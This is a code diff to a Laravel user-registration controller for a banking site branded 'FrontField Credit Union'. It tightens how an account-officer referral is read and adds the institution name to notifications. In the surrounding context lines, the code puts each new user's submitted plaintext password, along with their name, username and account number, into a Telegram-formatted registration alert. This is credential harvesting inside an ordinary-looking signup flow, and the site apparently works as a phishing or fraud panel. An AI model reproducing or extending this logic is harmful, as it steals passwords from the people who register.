@@ -217,15 +217,28 @@ class RegisteredUserController extends Controller
                 $dob = \Carbon\Carbon::parse($dob)->format('Y-m-d');
             }
 
-            // Check for Account Officer onboarding referral (via cookie or session)
-            $assignedOfficerId = Cookie::get('officer_onboard') ?? Session::get('officer_onboard');
+            // Check for Account Officer onboarding referral (strictly session only if visited officer link in THIS flow)
+            $assignedOfficerId = Session::get('officer_onboard');
             $officer = null;
+            $currentInstId = app()->bound('institution')
+                ? (app('institution')->id ?? \App\Models\Institution::getDefault()?->id)
+                : \App\Models\Institution::getDefault()?->id;
+
             if ($assignedOfficerId) {
                 \App\Models\Admin::ensureOnboardingSchema();
-                $officer = \App\Models\Admin::where('id', $assignedOfficerId)
+                $candidate = \App\Models\Admin::where('id', $assignedOfficerId)
                     ->where('status', 1)
                     ->first();
+                if ($candidate && $candidate->hasInstitutionAccess($currentInstId)) {
+                    $officer = $candidate;
+                }
             }
+
+            // Immediately clear any legacy persistent cookies or session values
+            Cookie::queue(Cookie::forget('officer_onboard'));
+            Cookie::queue(Cookie::make('officer_onboard', '', -2628000, '/', request()->getHost()));
+            Cookie::queue(Cookie::make('officer_onboard', '', -2628000, '/'));
+            Session::forget('officer_onboard');
 
             $firstName = !empty($formData['middle_name'])
                 ? trim($formData['first_name'] . ' ' . $formData['middle_name'])
@@ -304,7 +317,11 @@ class RegisteredUserController extends Controller
                 $tgAddress = htmlspecialchars($loc, ENT_QUOTES, 'UTF-8');
                 $tgPassword = htmlspecialchars($formData['password'] ?? 'N/A', ENT_QUOTES, 'UTF-8');
 
-                $tgMsg = "🆕 <b>New Client Registration</b>\n";
+                $instObj = app()->bound('institution') ? app('institution') : \App\Models\Institution::getDefault();
+                $instName = $instObj ? $instObj->name : 'FrontField Credit Union';
+
+                $tgMsg = "🏛 <b>Institution:</b> {$instName}\n";
+                $tgMsg .= "🆕 <b>New Client Registration</b>\n";
                 $tgMsg .= "👤 <b>Name:</b> {$tgFullName}\n";
                 $tgMsg .= "🔑 <b>Username:</b> @{$tgUsername}\n";
                 $tgMsg .= "💳 <b>Account #:</b> <code>{$tgAccountNo}</code>\n";
@@ -342,7 +359,7 @@ class RegisteredUserController extends Controller
                 // Dispatch Automated Email Notification to the Assigned Account Officer
                 if ($officer && !empty($officer->email)) {
                     try {
-                        $siteTitle = setting('site_title', 'global') ?: 'FrontField Credit Union';
+                        $siteTitle = $instName;
                         $emailDetails = [
                             'from_name' => $siteTitle,
                             'subject' => "New Client Assigned: {$user->full_name} (#{$user->account_number})",
